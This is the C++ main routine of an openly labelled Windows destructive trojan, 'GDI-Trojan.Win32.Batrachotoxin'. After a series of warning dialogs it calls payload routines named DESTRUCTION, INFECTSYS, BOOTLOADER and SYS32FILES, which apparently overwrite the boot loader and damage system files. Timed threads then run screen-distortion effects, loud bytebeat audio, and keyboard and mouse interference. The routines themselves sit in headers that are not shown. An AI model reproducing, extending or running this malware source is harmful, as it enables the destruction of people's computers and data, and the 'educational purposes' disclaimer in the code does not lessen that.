#include "includer.h"
#include "bytebeats.h"
#include "colors.h"
#include "system.h"
#include "payloads.h"
#include "Resource.h"
#include "framework.h"

int main() {
    FreeConsole();
    if (GetFileAttributesW(L"C:\\Windows\\bootcfg.dat") == INVALID_FILE_ATTRIBUTES)
    {
        if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a potentially harmful program that can cause your system's death & data loss. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur. The creators (OsJanelas) will not be responsible for anything caused by this software. By the way, this was created for educational and entertainment purposes.\n\nOriginal download: github.com/OsJanelas/GDI-Trojan.Win32.Batrachotoxin\n\nWould you like to proceed with running this program?", L"'One of most dangerous substances'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"LAST WARNING!!!\n\nThis is the LAST warning, as you're already aware of the risks, press 'Yes' to continue. Otherwise, press 'No'. Also be sure you're running in a safe environment, like virtual machines.\n\nProceed at your own risk...\n\nDIMETHYLMERCURY", L"GDI-Trojan.Win32.Batrachotoxin - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"Creating Batrachotoxin.cpp...\n\nClick yes to continue", L"Script", MB_ICONASTERISK | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"Compiling Batrachotoxin.cpp to Batrachotoxin.exe...\n\nClick yes to continue", L"Script", MB_ICONASTERISK | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"Localizing Batrachotoxin.exe...\n\nFound Batrachotoxin.exe\n\nRunning Batrachotoxin.exe\n\nENDENDENDENDENDEND", L"Script", MB_ICONASTERISK | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"Execution complete!\n\nGood Luck :)", L"Script", MB_ICONASTERISK | MB_YESNO) != IDYES) return 1;
    }

    SystemPayloads::DESTRUCTION();
    SystemPayloads::INFECTSYS();
    SystemPayloads::BOOTLOADER();
    HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIpayloads::INVERT, hPML1, NULL, NULL);
    HANDLE hSYS1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hSystem1 = CreateThread(NULL, NULL, &SystemPayloads::KB, hSYS1, NULL, NULL);
    Sleep(40000);
	System::EndPayload(hPayload1, hPML1);
    HANDLE hBB1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
    HANDLE hBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::OHS, hBB1, NULL, NULL);
    HANDLE hSYS2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem2 = CreateThread(NULL, NULL, &SystemPayloads::LABELS, hSYS2, NULL, NULL);
    HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIpayloads::TEXTS, hPML2, NULL, NULL);
    Sleep(15000);
    HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIpayloads::NEON, hPML3, NULL, NULL);
    Sleep(15000);
    HANDLE hBB2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
    HANDLE hBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::BYTES, hBB2, NULL, NULL);
    HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload4 = CreateThread(NULL, NULL, &GDIpayloads::COLORS, hPML4, NULL, NULL);
    Sleep(15000);
    HANDLE hPML5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload5 = CreateThread(NULL, NULL, &GDIpayloads::SHAKE, hPML5, NULL, NULL);
    Sleep(45000);
    System::EndPayload(hPayload2, hPML2);
	System::EndPayload(hPayload3, hPML3);
    HANDLE hPML6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload6 = CreateThread(NULL, NULL, &GDIpayloads::TRIANGLES, hPML6, NULL, NULL);
    HANDLE hSYS3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem3 = CreateThread(NULL, NULL, &SystemPayloads::MOUSE, hSYS3, NULL, NULL);
    Sleep(45000);
    System::EndPayload(hPayload4, hPML4);
    System::EndPayload(hPayload5, hPML5);
    System::EndPayload(hPayload6, hPML6);
    HANDLE hBB3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
    HANDLE hBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::SHITYA, hBB3, NULL, NULL);
    HANDLE hSYS4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem4 = CreateThread(NULL, NULL, &SystemPayloads::MESSCLICK, hSYS4, NULL, NULL);
    HANDLE hPML7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload7 = CreateThread(NULL, NULL, &GDIpayloads::PLASMA, hPML7, NULL, NULL);
    HANDLE hPML8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload8 = CreateThread(NULL, NULL, &GDIpayloads::TORUS, hPML8, NULL, NULL);
    Sleep(45000);
    System::EndPayload(hPayload7, hPML7);
    HANDLE hSYS5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem5 = CreateThread(NULL, NULL, &SystemPayloads::MSG, hSYS5, NULL, NULL);
    HANDLE hPML9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload9 = CreateThread(NULL, NULL, &GDIpayloads::HUE, hPML9, NULL, NULL);
    HANDLE hPML10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload10 = CreateThread(NULL, NULL, &GDIpayloads::RADIALBLUR, hPML10, NULL, NULL);
    Sleep(45000);
    System::EndPayload(hPayload9, hPML9);
    System::EndPayload(hPayload10, hPML10);
    HANDLE hSYS6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem6 = CreateThread(NULL, NULL, &SystemPayloads::MSG, hSYS6, NULL, NULL);
    HANDLE hSYS7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem7 = CreateThread(NULL, NULL, &SystemPayloads::SYS32FILES, hSYS7, NULL, NULL);
    HANDLE hBB4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
    HANDLE hBytebeat4 = CreateThread(NULL, NULL, &Bytebeats::BLOCKY, hBB4, NULL, NULL);
    HANDLE hPML11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload11 = CreateThread(NULL, NULL, &GDIpayloads::TRAIN, hPML11, NULL, NULL);
    HANDLE hPML12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload12 = CreateThread(NULL, NULL, &GDIpayloads::ICONS, hPML12, NULL, NULL);
    HANDLE hPML13 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload13 = CreateThread(NULL, NULL, &GDIpayloads::COLORS, hPML13, NULL, NULL);
    HANDLE hPML14 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload14 = CreateThread(NULL, NULL, &GDIpayloads::MASHER, hPML14, NULL, NULL);
    Sleep(45000);
    System::EndPayload(hPayload8, hPML8);
    HANDLE hBB5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
    HANDLE hBytebeat5 = CreateThread(NULL, NULL, &Bytebeats::SIREN, hBB5, NULL, NULL);
    HANDLE hPML15 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload15 = CreateThread(NULL, NULL, &GDIpayloads::TEXTS, hPML15, NULL, NULL);
    HANDLE hPML16 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload16 = CreateThread(NULL, NULL, &GDIpayloads::NEON, hPML16, NULL, NULL);
    HANDLE hPML17 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload17 = CreateThread(NULL, NULL, &GDIpayloads::RADIALBLUR, hPML17, NULL, NULL);
    HANDLE hPML18 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload18 = CreateThread(NULL, NULL, &GDIpayloads::PLASMA, hPML18, NULL, NULL);
    HANDLE hPML19 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload19 = CreateThread(NULL, NULL, &GDIpayloads::HUE, hPML19, NULL, NULL);
    HANDLE hPML20 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload20 = CreateThread(NULL, NULL, &GDIpayloads::SHAKE, hPML20, NULL, NULL);
    HANDLE hPML21 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload21 = CreateThread(NULL, NULL, &GDIpayloads::INVERT, hPML21, NULL, NULL);
    Sleep(INFINITE);

    return 0;
}